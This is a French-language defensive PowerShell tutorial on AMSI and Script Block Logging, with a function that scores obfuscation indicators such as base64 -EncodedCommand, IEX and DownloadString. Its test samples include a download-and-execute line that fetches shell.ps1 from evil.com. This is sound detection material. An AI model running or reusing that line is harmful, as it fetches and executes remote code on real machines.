**AMSI** (Antimalware Scan Interface) est l'interface Windows qui permet aux antivirus de scanner le contenu des scripts PowerShell, JavaScript, VBScript avant exécution. Il s'active pour tout code évalué par `Invoke-Expression`, `[ScriptBlock]::Create()`, etc.

**Pour le défenseur** : AMSI est une couche de détection native. On peut surveiller ses logs et augmenter sa visibilité.

```powershell
# Vérifier si AMSI est disponible
$amsiType = [System.Type]::GetType('System.Management.Automation.AmsiUtils', $false)
Write-Host "AMSI disponible : $($null -ne $amsiType)"

# Tester une détection AMSI (sûr — utilise le pattern de test standard)
try {
    $test = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
    Write-Host "PowerShell version : $($PSVersionTable.PSVersion)"
    Write-Host "AMSI actif dans cette session : $($PSVersionTable.PSVersion.Major -ge 5)"
} catch {
    Write-Host "Erreur : $_"
}

# Script Block Logging — configuration recommandée
# Enable via GPO ou registry :
$path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
if (Test-Path $path) {
    $enabled = (Get-ItemProperty $path -ErrorAction SilentlyContinue).EnableScriptBlockLogging
    Write-Host "Script Block Logging : $(if($enabled -eq 1) {'ACTIVÉ'} else {'DÉSACTIVÉ'})"
} else {
    Write-Host "Script Block Logging : Non configuré (recommandé : activer via GPO)"
}
```

```powershell
# Détecter les scripts PowerShell obfusqués dans les logs

function Test-ObfuscationPowerShell {
    param([string]$Code)

    $indicateurs = @()
    $score = 0

    # Encoding base64 (-EncodedCommand)
    if ($Code -match '-e(nc(odedcommand)?)?\s+[A-Za-z0-9+/]{20,}' ) {
        $indicateurs += 'Base64 EncodedCommand'
        $score += 30
    }

    # Backtick obfuscation
    $backticks = ([regex]::Matches($Code, '`')).Count
    if ($backticks -gt 5) {
        $indicateurs += "Backtick excessif ($backticks)"
        $score += $backticks * 2
    }

    # Concatenation de strings (ex: 'i'+'e'+'x')
    if ($Code -match "'[a-z]'\s*\+\s*'[a-z]'") {
        $indicateurs += 'Concaténation caractères (contournement détection)'
        $score += 20
    }

    # IEX / Invoke-Expression
    if ($Code -match 'iex|invoke-expression|\$env:comspec' ) {
        $indicateurs += 'IEX / Invoke-Expression'
        $score += 15
    }

    # DownloadString
    if ($Code -match 'downloadstring|downloadfile|webclient|bitstransfer') {
        $indicateurs += 'Téléchargement de code'
        $score += 25
    }

    $niveau = if ($score -ge 50) {'CRITIQUE'} elseif ($score -ge 25) {'HAUTE'} else {'FAIBLE'}

    return [PSCustomObject]@{
        Score       = $score
        Niveau      = $niveau
        Indicateurs = $indicateurs
    }
}

$exemples = @(
    'Write-Host "Hello"',
    'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
    "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
)

foreach ($code in $exemples) {
    $r = Test-ObfuscationPowerShell $code
    Write-Host "Score=$($r.Score) [$($r.Niveau)] : $($code.Substring(0,[Math]::Min(60,$code.Length)))"
    $r.Indicateurs | ForEach-Object { Write-Host "  → $_" }
}
```
